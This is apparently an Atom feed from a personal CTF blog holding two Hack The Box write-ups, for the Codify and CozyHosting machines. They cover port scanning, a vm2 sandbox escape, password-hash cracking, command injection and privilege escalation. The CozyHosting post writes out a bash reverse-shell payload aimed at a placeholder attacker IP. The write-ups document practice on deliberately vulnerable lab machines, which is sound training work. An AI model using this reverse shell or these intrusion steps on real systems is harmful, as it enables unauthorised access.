<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2023-11-19T12:40:48+00:00</updated><id>/feed.xml</id><title type="html">FH27RF</title><subtitle>CTF journal.</subtitle><entry><title type="html">HTB - Codify Writeup</title><link href="/writeup/2023/11/19/Codify-Writeup.html" rel="alternate" type="text/html" title="HTB - Codify Writeup" /><published>2023-11-19T00:00:00+00:00</published><updated>2023-11-19T00:00:00+00:00</updated><id>/writeup/2023/11/19/Codify-Writeup</id><content type="html" xml:base="/writeup/2023/11/19/Codify-Writeup.html"><![CDATA[<h1 id="this-writeup-is-meant-to-give-an-overview-of-the-challenges-solution-without-spoiling-too-much-of-the-key-details-so-you-can-still-have-fun-while-following-it-">This writeup is meant to give an overview of the challenge’s solution without spoiling too much of the key details so you can still have fun while following it !</h1>

<h1 id="1-initial-enumeration">1. Initial enumeration</h1>
<p>First and foremost, as usual for any challenge we can run a simple port scan using nmap:
<img src="/assets/writeups//assets/writeups/Codify/Selection_110.png" alt="" /></p>

<p>Given the port 80 is opened we can try to access this address from our browser. It is trying to redirect to codify.htb, so after adding it to our hosts file we land on the main page:
<img src="/assets/writeups//assets/writeups/Codify/Selection_111.png" alt="" /></p>

<h1 id="2-foothold">2. Foothold</h1>
<p>This site mainly consists of a sandbox that will run javascript code. This functionnality relies on the vm2 module which is vulnerable. After looking for an exploit I found a piece of code that allows us to run arbitrary system commands in the sandbox:
<img src="/assets/writeups//assets/writeups/Codify/Selection_079.png" alt="" /></p>

<p>This vulnerability can now be exploited to add our own ssh public key to the authorized list in /home/svc/.ssh/ which allows us to open an ssh session:
<img src="/assets/writeups//assets/writeups/Codify/Selection_082.png" alt="" /></p>

<h1 id="3-gaining-access">3. Gaining access</h1>
<p>From there we can look around, and there is an interesting file in the /var/www/contacts directory. tickets.db is a mysql database that we can directly open from this shell:
<img src="/assets/writeups//assets/writeups/Codify/Selection_084.png" alt="" /></p>

<p>This gives us a username and a hash we can now try to crack using John or Hashcat:
<img src="/assets/writeups//assets/writeups/Codify/Selection_085.png" alt="" /></p>

<p>We can now try to log in as joshua using ssh and retrieve the user flag from /home/joshua/user.txt !</p>

<h1 id="4-privilege-escalation">4. Privilege escalation</h1>
<p>The first step is to check if this user has access to commands with root privilege:
<img src="/assets/writeups//assets/writeups/Codify/Selection_088.png" alt="" /></p>

<p>We see that this user can run the following script with root privilege:
<img src="/assets/writeups//assets/writeups/Codify/Selection_090.png" alt="" /></p>

<p>This script’s comparison method is vulnerable given it doesn’t compare strings but is matching two expression, we can check that by running it and entering ‘*’ as the password which will backup data.
We can now use this to brute force the password one character at a time. For instance if the password is Qwerty123, running the script with Q* will be successful, then with Qw* etc.</p>

<p>Crafting a small script with python we then obtain the root password:
<img src="/assets/writeups/Codify/Selection_079e.png" alt="" /></p>

<p>We can now change to root with the su command and get the flag from /root/root.txt.
Congratulations !</p>]]></content><author><name></name></author><category term="writeup" /><category term="linux" /><category term="easy" /><summary type="html"><![CDATA[This writeup is meant to give an overview of the challenge’s solution without spoiling too much of the key details so you can still have fun while following it !]]></summary></entry><entry><title type="html">HTB - CozyHosting Writeup</title><link href="/writeup/2023/11/15/CozyHosting-Writeup.html" rel="alternate" type="text/html" title="HTB - CozyHosting Writeup" /><published>2023-11-15T00:00:00+00:00</published><updated>2023-11-15T00:00:00+00:00</updated><id>/writeup/2023/11/15/CozyHosting-Writeup</id><content type="html" xml:base="/writeup/2023/11/15/CozyHosting-Writeup.html"><![CDATA[<p>This writeup is meant to give an overview of the challenge’s solution without spoiling too much of the key details so you can still have fun while following it !</p>

<h1 id="1-initial-enumeration">1. Initial enumeration</h1>
<p>First and foremost, as usual for any challenge we can run a simple port scan using nmap:
<img src="/assets/writeups/CozyHosting/Selection_063.png" alt="" /></p>

<p>From this we can already see that the target hosts an HTTP server as well as an SSH server, which probably means that our entry point will probably be found in our browser visiting the site related to this IP; and the SSH server might be useful later once we find a login for it.</p>

<p>Visiting the ip from our browser redirects us to a website (dont forget to add this host in your /etc/hosts file):
<img src="/assets/writeups/CozyHosting/Selection_064.png" alt="" /></p>

<p>We can quickly see that most links are pointing at the main page, except for the login page:
<img src="/assets/writeups/CozyHosting/Selection_065.png" alt="" /></p>

<p>However after testing this page for SQL injections (manually or using a tool like sqlmap), this page doesn’t seem vulnerable. We can thus continue our enumeration with some dir busting using gobuster:
<img src="/assets/writeups/CozyHosting/Selection_066.png" alt="" /></p>

<p>This gives us a list of pages to visit, one of which seems to hold valuable information:
<img src="/assets/writeups/CozyHosting/Selection_046.png" alt="" /></p>

<p>This can be used to bypass the login and access to the admin panel:
<img src="/assets/writeups/CozyHosting/Selection_045.png" alt="" /></p>

<h1 id="2-foothold">2. Foothold</h1>
<p>We gained a first access on the site, we now need a way to execute arbitrary commands on the host.
On the adnmin page we can a function to patch hosts:
<img src="/assets/writeups/CozyHosting/Selection_067.png" alt="" /></p>

<p>We can put arbitrary values in both field and then intercept the request with Burp to tinker with it in Repeater. The idea is to find some inputs that would lead to a reverse shell. A payload like this one:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/YOUR_IP/PORT 0&gt;&amp;1
</code></pre></div></div>
<p>should be transformed in a way that will be executed by the request on the server. Using brackets, pipe and a proper encoding you should be able to get a reverse shell from this request!
<img src="/assets/writeups/CozyHosting/Selection_050.png" alt="" /></p>

<p>However, at this point we are yet to access a user account, we can only see a home for a user named ‘josh’.
A jar file is also present in /app, this file should be downloaded on our machine and extracted to inspect its content and find useful information.</p>

<p><img src="/assets/writeups/CozyHosting/Selection_051.png" alt="" /></p>

<p>The file application.properties contains credentials for a postegres database so we now need a way to access it as it might be our avenue to compromise a user account.</p>

<h1 id="3-gaining-access">3. Gaining access</h1>
<p>We now have all the information required to connect to the database:
<img src="/assets/writeups/CozyHosting/Selection_071.png" alt="" /></p>

<p>the user table contains two users with a password hash for each of them. Using John the ripper or Hashcat we can easily crack the admin password which is in the rockyou list.
<img src="/assets/writeups/CozyHosting/Selection_059.png" alt="" /></p>

<p>We can then use this password as well as the username retrieved earlier to connect to our target using SSH. This gives us access to our user flag !</p>

<h1 id="4-privilege-escalation">4. Privilege escalation</h1>
<p>Privilege escalation on this machine relies on a very common method, often found in easy challenges. Using ‘sudo -l’ you should have enough information to find which command can be exploited to get root access and open the flag in the /root directory ! (This site can help you find what you are looking for: https://gtfobins.github.io !)</p>

<p>Congratulations !</p>]]></content><author><name></name></author><category term="writeup" /><category term="linux" /><category term="easy" /><summary type="html"><![CDATA[This writeup is meant to give an overview of the challenge’s solution without spoiling too much of the key details so you can still have fun while following it !]]></summary></entry></feed>